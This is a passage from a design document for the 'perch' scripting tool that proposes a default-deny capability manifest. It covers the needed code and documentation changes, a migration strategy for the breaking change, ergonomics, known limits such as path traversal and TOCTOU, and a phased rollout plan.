    ReadRoots   []string    // NEW — allowed read path scopes
    WriteRoots  []string    // NEW — allowed write path scopes
    OS, Arch    []string    // (exists)
}
```

**`domain/capability.go`** (new) — the op→capability classification table + a `Grants.Permits(cap, args)` method. This is the single source of truth for "what does op X need."

**`domain/errors.go`** — add the six `*_not_permitted` kinds.

**`infra/capyloader/lib.capy`** + **`loader.go`** — grammar for `shell { bin … }`, `net { host … }`, `read "…" …`, `write "…" …`, `subprocess`. (The two-level `shell`/`net` blocks reuse the existing block-event machinery.)

**`infra/interpreter/interpreter.go`** — the pre-dispatch capability gate (§4). One function, called from `RunOp` before the handler. Reads `i.Program.Requirements`; honors the AND-with-operator-flags rule.

**`infra/ops/*`** — every effectful op tagged with its capability (a `map[string]Capability` registered alongside handlers). Most ops already return tagged errors; this adds the *pre-flight* gate so they never run when denied.

**`io/cli` + `orchestrator`** — flags (`--no-shell` etc.) move from "remove ambient capability" to "lower the file's ceiling further." A new flag like `--ambient` (or `--legacy`) re-enables the old all-access default for migration (see §8).

**`usecases/validate`** — `--check` already flags undeclared *literal* bins/hosts/env; extend it to flag undeclared *capabilities* (a literal `read_file "./x"` with no `read` grant) statically.

**`usecases/scan` + `simulate`** — both already model capabilities; they consume the richer manifest instead of inferring from op usage.

---

## 7. What would have to change — docs & GH Pages

This is a framing inversion, not just new pages. Every place that says "perch can do X; restrict with `--no-X`" must flip to "perch can do nothing; grant X with a `requires` block."

- **`docs/index.md` (GH Pages home)** — the hero and the "For platform / SRE / security teams" grid currently lead with *capability gating via CLI flags*. Reframe the headline security story as **default-deny / zero ambient authority**, with the CLI flags demoted to "tighten further." The `requires` chip already exists; it becomes the centerpiece, not a footnote.
- **`docs/sandbox.md`** — the biggest rewrite. Today it explains the capability model as operator-applied flags with an ambient-everything default. It must invert: the **file declares**, the default is **nothing**, the operator can only **subtract**. The "who writes the sandbox" section (author declares / user grants / runtime enforces the intersection) stays — but the *default* moves from "everything" to "nothing," which is the whole point.
- **Every code example with an effectful op** — `shell`, `mkdir`, `read_file`, `http_get`, `cp`, etc. — needs a `requires` block, or it's now a non-runnable example. This touches `guide.md`, `applications.md`, `op-reference.md`, the tutorials, `recipes/*`, and the demos. (The recent pass added `requires` to flagship examples and 13 recipes; under this model it becomes *mandatory for all of them*.)
- **`docs/requires.md`** — expand from "declare bins/hosts/env" to "the complete capability manifest," documenting `shell`/`net`/`read`/`write`/`subprocess`.
- **`docs/op-reference.md`** — annotate every op with the capability it requires (a column), so readers see at a glance which ops are pure and which need a grant.
- **`docs/errors.md`** — document the six `*_not_permitted` kinds.
- **`docs/migrating-from-shell.md` + a new migration note** — the "wrap your bash in a `shell` op" first step now also requires declaring the `shell` capability + the bins, so the wrap step gains one block.
- **`mkdocs.yml`** — add this doc to nav; reorder so the default-deny story is near the top.
- **README.md** — the "What perch is / isn't" and the hero need the same inversion as the GH home.

---

## 8. Breaking-change strategy

This is the largest breaking change perch could make: **every existing `.perch` file that touches anything external stops working** until it declares. That must be handled deliberately.

1. **Gate behind a major version.** Default-deny ships in (say) perch 1.0; 0.x keeps ambient-default. SemVer makes the break legible.
2. **A transition flag.** `perch --ambient` (and `PERCH_AMBIENT=1`) re-enables the old all-access default for one release cycle, with a deprecation warning printed on every run. CI can flip it off to find what breaks.
3. **A codemod / generator.** `perch --infer-requires FILE` walks the program, collects every effectful op + the literal paths/bins/hosts it uses, and **emits a `requires` block** the author can paste in and tighten. This is the single most important ergonomic lever — see §9.
4. **`--check` becomes the migration tool.** Run it, get the exact list of undeclared capabilities, add them. Wire into pre-commit so new files are born declared.

---

## 9. Ergonomics — making the narrow path the easy path

Every default-deny system that failed (Android pre-6, npm, browser permissions) failed because granting broadly was easier than granting narrowly. perch must make the opposite true:

- **`perch --infer-requires`** generates a *tight* manifest from real usage — paths as exact roots, bins as exact names, hosts as exact domains. The author starts narrow and only widens deliberately.
- **Declaring narrow is one line.** `read "./src"` is shorter than reasoning about it. Declaring broad (`read "/"`) is *visibly* alarming in review and flagged HIGH by `--scan`.
- **`--check` tells you exactly what's missing**, with the exact line to add. The feedback loop is: write op → check → paste the suggested grant.
- **Pure programs need no block at all.** A `.perch` that only transforms strings / JSON / hashes just works with zero ceremony — the ceremony scales with the danger.

---

## 10. Honest limits

- **This is in-process capability gating, not a kernel sandbox.** perch enforces the manifest by refusing to *dispatch* a denied op. It is airtight **only if every op is correctly classified** (§2) and there's no op that reaches the outside world without going through the gate. A misclassified op is a hole. For genuinely adversarial code, still layer an OS sandbox (`firejail` / `sandbox-exec` / a container) — and for untrusted *logic*, compile it to WASM and run it under `wasm_run` (see [trust-by-manifest.md](trust-by-manifest.md)), where the boundary is the WASM runtime, not perch's op table.
- **`shell` is a megacapability.** Once you grant `shell` + a bin, that bin can do anything *it* can do. perch gates *which* bin runs, not what the bin then does. The hash pin (`bin "x" hash "…"`) and `--no-shell-metachars` reduce, but don't eliminate, this. Prefer native ops over `shell` so `shell` can stay ungranted.
- **Filesystem path matching is prefix/glob, not a chroot.** Symlinks out of an allowed root, TOCTOU between check and use, and `..` traversal must be handled in the path canonicalizer or the guarantee leaks.
- **It does not make incorrect code correct.** It bounds the *blast radius* of bugs and malice; it does not prevent logic errors within granted capabilities.

---

## 11. Phased plan

1. **Capability classification + gate (no default change yet).** Add `domain/capability.go`, the interpreter gate, and the `*_not_permitted` errors — but keep the default ambient so nothing breaks. The gate is a no-op until a flag turns it on. Ship + test.
2. **Filesystem `read`/`write` scopes in `requires`.** Grammar + loader + path canonicalizer + enforcement. Still opt-in.
3. **`shell { bin … }` / `net { host … }` two-level capability switches.** Fold the existing bin/host allowlists under them.
4. **Named handles (§3.1).** `as NAME` in `requires`, handle-position resolution in `exec` / `read_file` / `http_get` / `get_env`, and the `unknown_capability` / `capability_kind_mismatch` static checks. Non-breaking: string forms keep working; handles are the recommended sugar.
5. **`perch --infer-requires` generator + `--check` capability coverage.** The migration toolchain, before the default flips. The generator can emit named handles directly.
6. **Flip the default to deny, behind perch 1.0 + `--ambient` escape hatch.** Docs/GH-Pages inversion lands with this. Deprecation cycle for `--ambient`.
7. **Remove `--ambient`.** Zero ambient authority is the only mode.

Phases 1–5 are non-breaking and independently shippable. Phase 6 is the inversion. Phase 7 is the end state: **a perch program has absolutely zero access to external resources except what it declares — no exceptions.**

---

## See also

- [docs/requires.md](requires.md) — the manifest as it exists today (bins / hosts / env + version + hash pins)
- [docs/sandbox.md](sandbox.md) — the current capability model (operator-applied flags) that this inverts
- [docs/trust-by-manifest.md](trust-by-manifest.md) — the same default-deny idea applied to embedded WASM modules
- [docs/errors.md](errors.md) — error-kind enum (where the `*_not_permitted` kinds would live)
